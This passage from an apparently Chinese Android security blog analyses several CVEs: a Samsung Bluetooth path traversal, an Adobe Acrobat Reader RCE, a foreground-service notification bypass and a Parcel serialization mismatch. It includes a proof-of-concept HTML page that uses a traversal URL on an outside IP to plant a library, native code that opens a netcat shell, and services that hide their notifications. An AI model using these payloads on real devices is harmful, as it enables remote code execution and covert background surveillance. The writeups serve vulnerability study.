android:name=&quot;com.samsung.android.provider.filterprovider.INSERT_MYFILTER&quot;/&gt; &lt;action android:name=&quot;com.samsung.android.provider.filterprovider.INSERT_MYFILTER_LIST&quot;/&gt; &lt;action android:name=&quot;com.samsung.android.provider.filterprovider.DELETE_MYFILTER&quot;/&gt; &lt;/intent-filter&gt;&lt;/service&gt; 有了这个bug，就可以利用之前的bug来调用服务，得到一个直接的文件写入，覆盖任何文件。 3.2 Samsung FactoryAirCommandManager路径穿越漏洞编号为CVE-2021-25450，并在2021年9月的三星安全公告中得到修复。 漏洞在BluetoothSocketModule模块中，它有两个子类BluetoothClient 和 BluetoothServer。该漏洞允许攻击者通过蓝牙socket发送文件到任意路径，最主要的是蓝牙的连接不需要用户同意。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102public void startSocket(Context context) { byte[] buffer = new byte[8192]; byte[] newBuffer = new byte[8192]; int maxLength = 0; ACUtil.log_i(CLASS_NAME, &quot;startSocket&quot;); this.readSocket = new BufferedReader(new InputStreamReader(this.is, Charset.forName(&quot;UTF-8&quot;))); ACUtil.log_i(CLASS_NAME, &quot;readSocket&quot;, &quot;readSocket: &quot; + this.readSocket); this.isRunning = true; while (true) { try { int read = this.is.read(buffer); if (read == -1) { break; } if (AirCommandManager.getInstance().getModeTo() == 10) { this.isMetaMode = true; } else { this.isMetaMode = false; } if (!this.isContinue) { this.startTime = System.currentTimeMillis(); this.isContinue = true; } ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;Receive &quot; + read + &quot; bytes: &quot; + Support.Functions.byteArrayToHexString(buffer, read)); if (this.isFileMode) { this.getFileSize += read; ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;getFileSize: &quot; + this.getFileSize); ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;file mode&quot;); this.fos.write(buffer, 0, read); this.mHandler.sendEmptyMessage(1); if (this.getFileSize &gt;= this.fileLength) { ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;end file mode&quot;); this.mHandler.sendEmptyMessage(2); this.isFileMode = false; this.fos.close(); this.getFileSize = 0; } } else if (this.isMetaMode) { String str = Support.Functions.byteArrayToHexString(buffer, read); this.mBluetoothBypassModule.sendDataFromSendModule(str, false); ACUtil.sendMessage(context, str); } else { System.arraycopy(buffer, 0, newBuffer, maxLength, read); maxLength += read; if (newBuffer[maxLength - 1] == 126) { ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;DIAG byte&quot;); byte[] fullBuffer = new byte[maxLength]; System.arraycopy(newBuffer, 0, fullBuffer, 0, maxLength); String str2 = Support.Functions.byteArrayToHexString(fullBuffer); ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;DIAG str: &quot; + str2); this.mBluetoothBypassModule.sendDataFromSendModule(str2, false); ACUtil.sendMessage(context, str2); maxLength = 0; Arrays.fill(newBuffer, (byte) 0); } else if (maxLength &gt; 1 &amp;&amp; newBuffer[maxLength - 2] == 13 &amp;&amp; newBuffer[maxLength - 1] == 10) { ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;string&quot;); byte[] fullBuffer2 = new byte[maxLength]; System.arraycopy(newBuffer, 0, fullBuffer2, 0, maxLength); String str3 = new String(fullBuffer2, 0, maxLength, &quot;UTF-8&quot;); if (str3.toUpperCase().contains(&quot;AT+FACMFILE&quot;)) { this.isFileMode = true; String subStr = str3.substring(str3.indexOf(&quot;=&quot;) + 1, str3.length() - 2); this.fileName = subStr.split(&quot;,&quot;)[0]; this.fileLength = Integer.parseInt(subStr.split(&quot;,&quot;)[1]); ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;name: &quot; + this.fileName + &quot; length: &quot; + this.fileLength); File file = new File(savePath); if (!file.exists()) { file.mkdirs(); } File file2 = new File(savePath + this.fileName); ACUtil.log_d(CLASS_NAME, &quot;Socket&quot;, &quot;Save: &quot; + file2.getPath()); if (this.fileLength != 0) { this.fos = new FileOutputStream(file2); this.mHandler.sendEmptyMessage(0); } maxLength = 0; Arrays.fill(newBuffer, (byte) 0); } else { ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;end string&quot;); String str4 = str3 + &quot;\\r\\n&quot;; ACUtil.log_i(CLASS_NAME, &quot;Socket&quot;, &quot;str: &quot; + str4); this.mBluetoothBypassModule.sendDataFromSendModule(str4, false); maxLength = 0; Arrays.fill(newBuffer, (byte) 0); } } } } catch (Exception e) { e.printStackTrace(); BluetoothService.mHandler.sendEmptyMessageDelayed(1000, 3000L); } } this.mHandler.sendEmptyMessage(2); this.isFileMode = false; if (this.fos != null) { try { this.fos.close(); } catch (IOException e1) { e1.printStackTrace(); } }} 文件路径是由蓝牙套接字流输入指定的，没有对路径进行检查，所以攻击者可以利用这一点来覆盖在FactoryAirCommandManager上下文中的任意文件。而且，这个程序拥有强制接受任何蓝牙配对请求的权限，因为BluetoothService的代码会自动检索并设置配对PIN码。这就使得攻击者可以悄悄地触发这个漏洞，而不需要欺骗用户手动确认蓝牙配对。 4. 漏洞利用可以注入的代码有两种类型： /data/app/A/lib中的so文件； /data/app/A/中的base.apk。 对于第一种类型，可以直接注入so，因为应用程序安装后，PackageManagerService就不会再对so进行检查了，直至应用程序卸载或完全更新。 对于第二种类型，思路是使用重打包的包来替换base.apk，这种方式较为灵活，可以绕过应用程序对动态库的校验，以及，对于没有库的应用程序也可以正常使用。这种方式的缺点是，PackageManagerService会在每一次重启后，重新校验应用程序，这个过程会导致失败，也就意味着，这种方式只能存活一次。 对于第一种类型，京东的思路是注入共享库，然后，应用程序启动并加载共享库，共享库再启动 frida-gadget，最后运行攻击脚本。同时，京东还使用了LIFE对应用程序原始的共享库进行注入，使用LIFE时需要注意的一点是，要在注入的文件中使用一个足够长的路径，因为Android会在安装路径中添加随机后缀。","link":"/2022/07/04/Android-11-%E9%AD%94%E5%BD%A2%E5%A5%B3%E6%BC%8F%E6%B4%9E/"},{"title":"Android Adobe Acrobat Reader RCE(CVE-2021-40724)","text":"前言很久没有看android的漏洞了，正好最近看看这个，学习一下思路。 原文链接：https://hulkvision.github.io/blog/post1/ 漏洞分析应用程序包含一个intent-filter，可以接受带有URL的intent，mime为application/pdf，当收到这样的intent时，应用程序会将pdf文件下载到Downloads目录中。问题在于这个URL可以导致路径穿越。 1234567891011121314&lt;activity android:theme=&quot;@style/Theme_Virgo_SplashScreen&quot; android:name=&quot;com.adobe.reader.AdobeReader&quot; android:exported=&quot;true&quot; android:launchMode=&quot;singleTask&quot; android:screenOrientation=&quot;user&quot; android:configChanges=&quot;keyboardHidden|screenLayout|screenSize|smallestScreenSize&quot; android:noHistory=&quot;false&quot; android:resizeableActivity=&quot;true&quot;&gt;...... &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.VIEW&quot;/&gt; &lt;action android:name=&quot;android.intent.action.EDIT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;/&gt; &lt;category android:name=&quot;android.intent.category.BROWSABLE&quot;/&gt; &lt;data android:scheme=&quot;file&quot;/&gt; &lt;data android:scheme=&quot;content&quot;/&gt; &lt;data android:scheme=&quot;http&quot;/&gt; &lt;data android:scheme=&quot;https&quot;/&gt; &lt;data android:mimeType=&quot;application/pdf&quot;/&gt; &lt;/intent-filter&gt;...... com.adobe.reader.AdobeReader接收到 Intent 并启动ARFileURLDownloadActivity。 12345678public void handleIntent() {...... Intent intent2 = new Intent(this, ARFileURLDownloadActivity.class); intent2.putExtra(ARFileTransferActivity.FILE_PATH_KEY, intent.getData()); intent2.putExtra(ARFileTransferActivity.FILE_MIME_TYPE, intent.getType()); startActivity(intent2);......} ARFileURLDownloadActivity启动com.adobe.reader.misc.ARFileURLDownloadService服务。 12345678public void onMAMCreate(Bundle bundle) { super.onMAMCreate(bundle); this.mServiceIntent = new Intent(this, ARFileURLDownloadService.class); Bundle bundle2 = new Bundle(); //...// this.mServiceIntent.putExtras(bundle2); startService();} com.adobe.reader.misc.ARFileURLDownloadService.java 123456789public int onMAMStartCommand(Intent intent, int i, int i2) { Bundle extras = intent.getExtras(); //..// String string = extras.getString(ARFileTransferActivity.FILE_MIME_TYPE, null); ARURLFileDownloadAsyncTask aRURLFileDownloadAsyncTask = new ARURLFileDownloadAsyncTask(ARApp.getInstance(), (Uri) extras.getParcelable(ARFileTransferActivity.FILE_PATH_KEY), (String) extras.getCharSequence(ARFileTransferActivity.FILE_ID_KEY), true, string); this.mURLFileDownloadAsyncTask = aRURLFileDownloadAsyncTask; aRURLFileDownloadAsyncTask.taskExecute(new Void[0]); return 2;} com.adobe.reader.misc.ARURLFileDownloadAsyncTask.java 1234567891011121314151617181920private void downloadFile() throws IOException, SVFileDownloadException { Exception exc; boolean z; Throwable th; boolean z2; Uri fileURI = this.mDownloadModel.getFileURI(); URL url = new URL(fileURI.toString()); try { String downloadFile = new ARFileFromURLDownloader(new ARFileFromURLDownloader.DownloadUrlListener() { ARFileFromURLDownloader.DownloadUrlListener public void onProgressUpdate(int i, int i2) { ARURLFileDownloadAsyncTask.this.broadcastUpdate(0, i, i2); } @Override // com.adobe.reader.misc.ARFileFromURLDownloader.DownloadUrlListener public boolean shouldCancelDownload() { return ARURLFileDownloadAsyncTask.this.isCancelled(); } }).downloadFile(BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData(fileURI.getLastPathSegment(), this.mDownloadModel.getMimeType(), null, fileURI), url);//...// BBIntentUtils.getModifiedFileNameWithExtensionUsingIntentData将 this.mUri.getLastPathSegment() 作为参数，并返回 url 路径中解码的最后一段。 例如url https://localhost/x/..%2F..%2Ffile.pdf，当这个 url 被传递给 getLastPathSegment() 方法时，它将..%2F..%2Ffile.pdf作为 url 的最后一段并以../../file.pdf作为输出返回。 在将变量传递给 File 实例之前没有对变量执行任何清理，downloadFile将导致路径穿越漏洞。 RCEAdobe Acrobat Reader 应用程序使用 Google play 核心库为其用户提供额外的功能。 可以通过检查/data/data/:application_id/files/目录中的spiltcompat目录来判断应用程序是否使用 play 核心库进行动态代码加载。 没看见有这个目录。 作者说他可以在应用程序/data/data/com.adobe.reader/files/splitcompat/1921618197/verified-splits/目录中释放任意APK，并且，这个APK中的类，还可以自动添加到应用程序的ClassLoader中，具体参考https://blog.oversecured.com/Why-dynamic-code-loading-could-be-dangerous-for-your-apps-a-Google-example/。 经过分析，使用Google play core library的应用程序，支持从/data/data/com.adobe.reader/files/splitcompat/:id/native-libraries/目录中加载so文件。 Adobe Acrobat Reader 的模块Adobe Acrobat Reader 也会从该目录中加载so文件，通过逆向分析这个模块，发现这个模块会加载三个库：libADCComponent.so，libColoradoMobile.so 和 libopencv_info.so。通过这三个库可以实现代码执行。 POC能路径穿越，能下载成功，但是so文件会显示错误，然后自动删除。 12345678&lt;html&gt;&lt;title&gt; RCE in Adobe Acrobat Reader for android &lt;/title&gt;&lt;body&gt; &lt;script&gt; window.location.href=&quot;intent://34.127.85.178/x/x/x/x/x/..%2F..%2F..%2F..%2F..%2Fdata%2Fdata%2Fcom.adobe.reader%2Ffiles%2Fsplitcompat%2F1921819312%2Fnative-libraries%2FFASOpenCVDF.config.arm64_v8a%2Flibopencv_info.so#Intent;scheme=http;type=application/*;package=com.adobe.reader;component=com.adobe.reader/.AdobeReader;end&quot;; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 1234567891011121314151617#include &lt;jni.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) { if (fork() == 0) { system(&quot;toybox nc -p 6666 -L /system/bin/sh -l&quot;); } JNIEnv* env; if (vm-&gt;GetEnv(reinterpret_cast&lt;void**&gt;(&amp;env), JNI_VERSION_1_6) != JNI_OK) { return JNI_ERR; } return JNI_VERSION_1_6;} 补丁com.adobe.libs.buildingblocks.utils.BBIntentUtils.java 12345678910111213141516171819202122232425private static final String FILE_NAME_RESERVED_CHARACTER = &quot;[*/\\\\|?&lt;&gt;\\&quot;]&quot;;public static String getModifiedFileNameWithExtensionUsingIntentData(String str, String str2, ContentResolver contentResolver, Uri uri) { if (TextUtils.isEmpty(str)) { str = BBConstants.DOWNLOAD_FILE_NAME; } String str3 = null; if (!(contentResolver == null || uri == null)) { str3 = MAMContentResolverManagement.getType(contentResolver, uri); } String str4 = !TextUtils.isEmpty(str3) ? str3 : str2; if (!TextUtils.isEmpty(str4)) { String fileExtensionFromMimeType = BBFileUtils.getFileExtensionFromMimeType(str4); if (!TextUtils.isEmpty(fileExtensionFromMimeType)) { if (str.lastIndexOf(46) == -1) { str = str + '.' + fileExtensionFromMimeType; } else { String mimeTypeForFile = BBFileUtils.getMimeTypeForFile(str); if (TextUtils.isEmpty(mimeTypeForFile) || (!TextUtils.equals(mimeTypeForFile, str3) &amp;&amp; !TextUtils.equals(mimeTypeForFile, str2))) { str = str + '.' + fileExtensionFromMimeType; } } } } return str.replaceAll(FILE_NAME_RESERVED_CHARACTER, &quot;_&quot;);}","link":"/2022/01/18/Android-Adobe-Acrobat-Reader-RCE-CVE-2021-40724/"},{"title":"Android Foreground 驻留漏洞(CVE-2020-0108)","text":"前言前台服务的处理代码中存在着逻辑漏洞，成功利用该漏洞的攻击者可以绕过前台服务的通知显示并持续在后台运行，可以在后台进行一些定位、录音等操作。 影响范围Android 8.1、9、10。 漏洞 前台服务是Google在Android 8.0中引入的概念，由于Android 8.0不允许后台启动后台服务，所以设计了前台服务，前台服务优先级较高，可以长时间在后台运行，但是前台服务在启动后5秒必须绑定一个通知，否则会被杀死。 实际上，前台服务依旧是在“后台”运行的，只是由于绑定了一个用户可见的通知，所以Google称之为“前台服务”。 漏洞1NotificationManagerService.java的onNotificationError()方法，未能正确处理通知显示时的异常。 123456@Overridepublic void onNotificationError(int callingUid, int callingPid, String pkg, String tag, int id, int uid, int initialPid, String message, int userId) { cancelNotification(callingUid, callingPid, pkg, tag, id, 0, 0, false, userId, REASON_ERROR, null);} 前台服务启动后，即使未能正确地显示通知，也不会导致前台服务终止。比如前台服务在创建通知时使用了自定义的布局，在创建RemoteViews对象时传入了一个不存在的layout ID，造成NotificationManagerService对通知的布局解析失败而抛出异常，此时会调用到onNitificationError方法。由于onNotificationError方法中只是调用了cancelNotification方法来取消通知，而没有去终止服务或终止整个应用程序，这时候前台服务就会在不显示通知的情况下继续运行。 实际测试好像还是需要捕获异常才行，否则应用直接崩溃，但是没看见在哪抛出异常啊。 漏洞2ServiceRecord中postNotification方法中，没有正确处理通知显示中的异常情况，而是将异常抛出给了用户程序。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116public void postNotification() { final int appUid = appInfo.uid; final int appPid = app.pid; if (foregroundId != 0 &amp;&amp; foregroundNoti != null) { // Do asynchronous communication with notification manager to // avoid deadlocks. final String localPackageName = packageName; final int localForegroundId = foregroundId; final Notification _foregroundNoti = foregroundNoti; ams.mHandler.post(new Runnable() { public void run() { NotificationManagerInternal nm = LocalServices.getService( NotificationManagerInternal.class); if (nm == null) { return; } Notification localForegroundNoti = _foregroundNoti; try { if (localForegroundNoti.getSmallIcon() == null) { // It is not correct for the caller to not supply a notification // icon, but this used to be able to slip through, so for // those dirty apps we will create a notification clearly // blaming the app. Slog.v(TAG, &quot;Attempted to start a foreground service (&quot; + shortInstanceName + &quot;) with a broken notification (no icon: &quot; + localForegroundNoti + &quot;)&quot;); CharSequence appName = appInfo.loadLabel( ams.mContext.getPackageManager()); if (appName == null) { appName = appInfo.packageName; } Context ctx = null; try { ctx = ams.mContext.createPackageContextAsUser( appInfo.packageName, 0, new UserHandle(userId)); Notification.Builder notiBuilder = new Notification.Builder(ctx, localForegroundNoti.getChannelId()); &lt;------- 1 // it's ugly, but it clearly identifies the app notiBuilder.setSmallIcon(appInfo.icon); // mark as foreground notiBuilder.setFlag(Notification.FLAG_FOREGROUND_SERVICE, true); Intent runningIntent = new Intent( Settings.ACTION_APPLICATION_DETAILS_SETTINGS); runningIntent.setData(Uri.fromParts(&quot;package&quot;, appInfo.packageName, null)); PendingIntent pi = PendingIntent.getActivityAsUser(ams.mContext, 0, runningIntent, PendingIntent.FLAG_UPDATE_CURRENT, null, UserHandle.of(userId)); notiBuilder.setColor(ams.mContext.getColor( com.android.internal .R.color.system_notification_accent_color)); notiBuilder.setContentTitle( ams.mContext.getString( com.android.internal.R.string .app_running_notification_title, appName)); notiBuilder.setContentText( ams.mContext.getString( com.android.internal.R.string .app_running_notification_text, appName)); notiBuilder.setContentIntent(pi); localForegroundNoti = notiBuilder.build(); } catch (PackageManager.NameNotFoundException e) { } } if (nm.getNotificationChannel(localPackageName, appUid, localForegroundNoti.getChannelId()) == null) { int targetSdkVersion = Build.VERSION_CODES.O_MR1; try { final ApplicationInfo applicationInfo = ams.mContext.getPackageManager().getApplicationInfoAsUser( appInfo.packageName, 0, userId); targetSdkVersion = applicationInfo.targetSdkVersion; } catch (PackageManager.NameNotFoundException e) { } if (targetSdkVersion &gt;= Build.VERSION_CODES.O_MR1) { throw new RuntimeException( &quot;invalid channel for service notification: &quot; + foregroundNoti); } } if (localForegroundNoti.getSmallIcon() == null) { // Notifications whose icon is 0 are defined to not show // a notification, silently ignoring it. We don't want to // just ignore it, we want to prevent the service from // being foreground. throw new RuntimeException(&quot;invalid service notification: &quot; + foregroundNoti); } nm.enqueueNotification(localPackageName, localPackageName, appUid, appPid, null, localForegroundId, localForegroundNoti, userId); foregroundNoti = localForegroundNoti; // save it for amending next time } catch (RuntimeException e) { &lt;------- 2 Slog.w(TAG, &quot;Error showing notification for service&quot;, e); // If it gave us a garbage notification, it doesn't // get to be foreground. ams.setServiceForeground(instanceName, ServiceRecord.this, 0, null, 0, 0); ams.crashApplication(appUid, appPid, localPackageName, -1, &quot;Bad notification for startForeground: &quot; + e); } } }); }} 在这种情况下，前台服务启动后，若用户程序捕获了主线程的异常，即使未能正确显示通知，也不会导致前台服务终止。比如说前台服务在创建通知时传入了不合法的Channel ID，这样在ServiceRecord的postNotification方法中发送通知时，就会抛出异常。在异常处理过程中，只是调用了AMS的crashApplication方法来向应用抛出一个主线程的异常，但是如果应用在主线程捕获了异常，则应用就不会崩溃，这时候前台服务就会在不显示通知的情况下继续运行。 12345678910111213141516public void crashApplication(int uid, int initialPid, String packageName, int userId, String message) { if (checkCallingPermission(android.Manifest.permission.FORCE_STOP_PACKAGES) != PackageManager.PERMISSION_GRANTED) { String msg = &quot;Permission Denial: crashApplication() from pid=&quot; + Binder.getCallingPid() + &quot;, uid=&quot; + Binder.getCallingUid() + &quot; requires &quot; + android.Manifest.permission.FORCE_STOP_PACKAGES; Slog.w(TAG, msg); throw new SecurityException(msg); } synchronized(this) { mAppErrors.scheduleAppCrashLocked(uid, initialPid, packageName, userId, message); }} 漏洞利用漏洞11234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465public class FServiceA extends Service { private static final String TAG = &quot;FServiceA&quot;; @Override public IBinder onBind(Intent intent) { // TODO: Return the communication channel to the service. throw new UnsupportedOperationException(&quot;Not yet implemented&quot;); } @Override public int onStartCommand(Intent intent, int flags, int startId) { new Handler(Looper.getMainLooper()).post(new Runnable() { @Override public void run() { while (true) { try { Looper.loop(); } catch (Throwable e) { e.printStackTrace(); } } } }); NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE); NotificationChannel notificationChannel = new NotificationChannel(&quot;c01&quot;, &quot;CVE-2020-0108&quot;, NotificationManager.IMPORTANCE_DEFAULT); notificationChannel.setDescription(&quot;Testing CVE-2020-0108&quot;); notificationChannel.enableLights(true); notificationChannel.setLightColor(Color.RED); notificationChannel.enableVibration(true); notificationChannel.setVibrationPattern(new long[]{100, 200, 300, 400, 500, 400, 300, 200, 100}); notificationManager.createNotificationChannel(notificationChannel); // Create a RemoteViews object with a invalid layout ID RemoteViews remoteViews = new RemoteViews(getPackageName(), -1 /* A Invalid Layout ID */); Notification notification = new NotificationCompat.Builder(this, &quot;c01&quot;) .setContentTitle(&quot;Testing CVE-2020-0108&quot;) .setContentText(&quot;If you see this means you device is not vulnerable&quot;) .setCustomBigContentView(remoteViews) .setWhen(System.currentTimeMillis()) .setSmallIcon(R.drawable.ic_launcher_foreground) .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground)) .build(); startForeground(1, notification); new Thread(new MyRunnable()).start(); return super.onStartCommand(intent, flags, startId); } public class MyRunnable implements Runnable { @Override public void run() { for(int i = 0; i &lt; 15; i++) { Log.e(&quot;onNotificationError&quot;,&quot;Run Count: &quot; + i); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } } } }} 漏洞2123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public class FServiceB extends Service { private static final String TAG = &quot;FServiceB&quot;; @Override public IBinder onBind(Intent intent) { // TODO: Return the communication channel to the service. throw new UnsupportedOperationException(&quot;Not yet implemented&quot;); } @Override public int onStartCommand(Intent intent, int flags, int startId) {// Handle the exception in main loop new Handler(Looper.getMainLooper()).post(new Runnable() { @Override public void run() { while (true) { try { Looper.loop(); } catch (Throwable e) { e.printStackTrace(); } } } });// Create a Notification object with a invalid channel ID Notification notification = new NotificationCompat.Builder(this, &quot;InvalidInvalidInvalid&quot; /* A Invalid Channel ID */) .setContentTitle(&quot;Testing CVE-2020-0108&quot;) .setContentText(&quot;If you see this means you device is not vulnerable&quot;) .setWhen(System.currentTimeMillis()) .setSmallIcon(R.drawable.ic_launcher_foreground) .setLargeIcon(BitmapFactory.decodeResource(getResources(), R.drawable.ic_launcher_foreground)) .build(); startForeground(2, notification); new Thread(new MyRunnable()).start(); return super.onStartCommand(intent, flags, startId); } public class MyRunnable implements Runnable { @Override public void run() { for(int i = 0; i &lt; 15; i++) { Log.e(&quot;postNotification&quot;,&quot;Run Count: &quot; + i); try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } } } }}","link":"/2022/06/25/Android-Foreground-%E9%A9%BB%E7%95%99%E6%BC%8F%E6%B4%9E-CVE-2020-0108/"},{"title":"Android-CVE-2021-0928","text":"原文链接：https://github.com/michalbednarski/ReparcelBug2 漏洞位置android.hardware.camera2.params.OutputConfiguration.java中的 writeToParcel/createFromParcel 不匹配导致的。 影响版本Android 9 至 Android 11，Android 12 Developer Preview 3，在官方Android 12发布版中修复。 复现环境Android 12 Beta 2 and 3 背景知识Parcel在Android的两个activity之间传递对象，则这个对象必须要进行序列化，在Android中实现序列化有两种方式，一是实现Serializable接口，二是实现Parcelable接口。Parcelable的方式要比Serializable的效率要高。 Android上的大部分IPC都是基于一个叫Parcel的类。基本的Parcel用法如下： 123Parcel p = Parcel.obtain();p.writeInt(1);p.writeString(&quot;Hello&quot;); 然后Parcel通过Binder将消息传递给其他进程，为了测试，可以调用p.setDataPosition(0)将消息设置为起始位置并开始读取。 12int a = p.readInt(); // a = 1String b = p.readString(); // b = &quot;Hello&quot; 需要注意的是，Parcel内部保存着读取的位置。Parcel类的使用者应当确保read*方法与之前使用的write*方法相匹配，否则后续的读取操作将来自缓冲区中的错误位置。 Parcel还支持自定义object，通过Parcelable接口来实现。 实现Parcelable接口需要实现接口中的两个方法： public int describeContents();，内容接口描述，默认返回0即可； public void writeToParcel(Parcel dest, int flags);，将对象序列化成一个Parcel对象。 然后，还需要实例化静态内部对象CREATOR来实现Parcelable.Creator，实现CREATOR时要实现其中的方法： createFromParcel，从Parcel中读取前面序列化的对象。 下面是一个实现该接口的例子（WindowContainerTransaction类被用作exp gadget利用链中的一部分）： 12345678910111213141516171819202122232425package android.window;public final class WindowContainerTransaction implements Parcelable { private final ArrayMap&lt;IBinder, Change&gt; mChanges = new ArrayMap&lt;&gt;(); private final ArrayList&lt;HierarchyOp&gt; mHierarchyOps = new ArrayList&lt;&gt;(); private WindowContainerTransaction(Parcel in) { in.readMap(mChanges, null /* loader */); in.readList(mHierarchyOps, null /* loader */); } @Override public void writeToParcel(@NonNull Parcel dest, int flags) { dest.writeMap(mChanges); dest.writeList(mHierarchyOps); } @NonNull public static final Creator&lt;WindowContainerTransaction&gt; CREATOR = new Creator&lt;WindowContainerTransaction&gt;() { @Override public WindowContainerTransaction createFromParcel(Parcel in) { return new WindowContainerTransaction(in); } };} 如上所示，在写的时候调用writeToParcel()函数，在读的时候调用CREATOR.createFromParcel()函数。Parcelable接口的实现需要确保createFromParcel()函数读取的数据与writeToParcel()函数写入的数据一致，否则后续的读取将要出错。 这样的类可以通过以下方式读取/写入Parcel： 直接调用 obj.writeToParcel(parcel, 0) / obj = WindowContainerTransaction.CREATOR.createFromParcel()，这经常用于类是已知的，比如，当Parcelable拥有不同的Parcelable字段，或者当定义RPC方法时由AIDL生成的包含以Parcelable为参数的代码。 通过 Parcel.writeParcelable/readParcelable。writeParcelable首先写入类的名称，然后调用Parcelable接口的writeToParcel方法。readParcelable读取写入的类的名称，在提供的ClassLoader或BOOTCLASSPATH（提供的参数为null）中查找该类名。一旦找到该类，则通过其静态字段CREATOR获取Parcelable.Creator实例（被用于读取这个类）。另外， 当使用readParcelable方法时，它可以读取类路径中的任何Parcelable，因为要创建的对象的名称是从同一个Parcel中读取的。 readParcelable被许多其他的Parcel方法所使用，例如上面的例子中看到的readList通过readValue读取元素，这是Parcel中最通用的传输对象的方法，它使用的方式之一就是通过readParcelable。在上面的例子中，由于Java的类型清除，ArrayList&lt;HierarchyOp&gt; mHierarchyOps字段实际上可以包含Parcel支持的任何对象，而不仅仅是那些与通用类型声明中指定的类型兼容的对象。 BroadcastReceiver从开发者角度来看，BroadcastReceiver 的工作方式如下：应用程序调用sendBroadcast 发送广播，当广播的Intent与 AndroidManifest.xml中定义的 &lt;receiver&gt; 匹配上以后，系统将启动接收该广播的应用程序， 将&lt;receiver android:name&gt;属性中定义的BroadcastReceiver子类实例化，然后调用onReceive方法。 接收广播的过程中与system_server发生的通信： 当应用进程开始启动时，将调用IActivityManager.attachApplication()，通过这样，传递ApplicationThread句柄，系统用这个句柄来告诉应用进程要做什么。 当系统想在应用进程中执行清单中注册的BroadcastReceiver时，它使用上面提到的IApplicationThread调用scheduleReceiver方法。这个方法有多个参数，但这里最重要的是前两个： Intent intent，在调用sendBroadcast()时传递给系统的。 ActivityInfo info，它包含了要执行的组件的信息。这个参数的值是由系统从包管理器服务中获取的。最重要的是，在这个参数中传递的数据包括处理收到的广播的Java类的文件路径。 利用路径：调用sendBroadcast()，传递一个Intent，这将导致导致调用scheduleReceiver的应用程序接收到一个被篡改的ActivityInfo。 需要注意的是，这种新的利用途径在Android 12中变得可行，因为以前没有办法在Intent中放入任意的Parcelable（Intent的extra不算，因为它们被放入Bundle中，Bundle的整个长度被写入Parcel中，并作为单个blob被读取，所以extra不会导致它们包含的Intent对象解析出错）。 漏洞原理writeToParcel/createFromParcel如上所述，Parcelable接口的实现需要确保createFromParcel()函数读取的数据与writeToParcel()函数写入的数据一致。每当BOOTCLASSPATH中存在一个可以违反该约定的Parcelable时，就会产生一个漏洞，因为可能导致以下情况的发生： 恶意应用程序向system_server发送一个Bundle 或Parcelable，其中包含有问题的Parcelable实例以及专门构建的数据，这些数据将在步骤3中读取，但在步骤2中传递。 system_server验证Bundle是安全的，然后转发，或者system_server将提供的Parcelable传递给AIDL方法，该方法的下一个参数中也有关键数据（如果该参数中收到的数据可能被修改，将导致安全问题）。 另一个应用程序从system_server接收数据并信任它，但由于错误的序列化，它实际看到的数据与system_server打算发送的数据不同。 漏洞触发大多数时候，writeToParcel/createFromParcel不匹配的情况是，在这些方法中的一个字段被遗忘或写了两次，在这种情况下，发送这样的对象总是会触发不匹配。 接下来看看有漏洞的类（源码如下，标有//的代码是手动添加的，因为在作者写writeup时它们还不在AOSP中）（这里是最初引入漏洞的提交，但它是在Android 12发布后发布的）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172package android.hardware.camera2.params;public final class OutputConfiguration implements Parcelable { private OutputConfiguration(@NonNull Parcel source) { int rotation = source.readInt(); int surfaceSetId = source.readInt(); int surfaceType = source.readInt(); int width = source.readInt(); int height = source.readInt(); boolean isDeferred = source.readInt() == 1; boolean isShared = source.readInt() == 1; ArrayList&lt;Surface&gt; surfaces = new ArrayList&lt;Surface&gt;(); source.readTypedList(surfaces, Surface.CREATOR); String physicalCameraId = source.readString(); boolean isMultiResolution = source.readInt() == 1; // New in Android 12 ArrayList&lt;Integer&gt; sensorPixelModesUsed = new ArrayList&lt;Integer&gt;(); // New in Android 12 source.readList(sensorPixelModesUsed, Integer.class.getClassLoader()); // New in Android 12 // SNIP: copy values from variables set above to fields of this class } public static final @android.annotation.NonNull Parcelable.Creator&lt;OutputConfiguration&gt; CREATOR = new Parcelable.Creator&lt;OutputConfiguration&gt;() { @Override public OutputConfiguration createFromParcel(Parcel source) { try { OutputConfiguration outputConfiguration = new OutputConfiguration(source); return outputConfiguration; } catch (Exception e) { Log.e(TAG, &quot;Exception creating OutputConfiguration from parcel&quot;, e); return null; } } @Override public OutputConfiguration[] newArray(int size) { return new OutputConfiguration[size]; } }; @Override public void writeToParcel(Parcel dest, int flags) { if (dest == null) { throw new IllegalArgumentException(&quot;dest must not be null&quot;); } dest.writeInt(mRotation); dest.writeInt(mSurfaceGroupId); dest.writeInt(mSurfaceType); dest.writeInt(mConfiguredSize.getWidth()); dest.writeInt(mConfiguredSize.getHeight()); dest.writeInt(mIsDeferredConfig ? 1 : 0); dest.writeInt(mIsShared ? 1 : 0); dest.writeTypedList(mSurfaces); dest.writeString(mPhysicalCameraId); 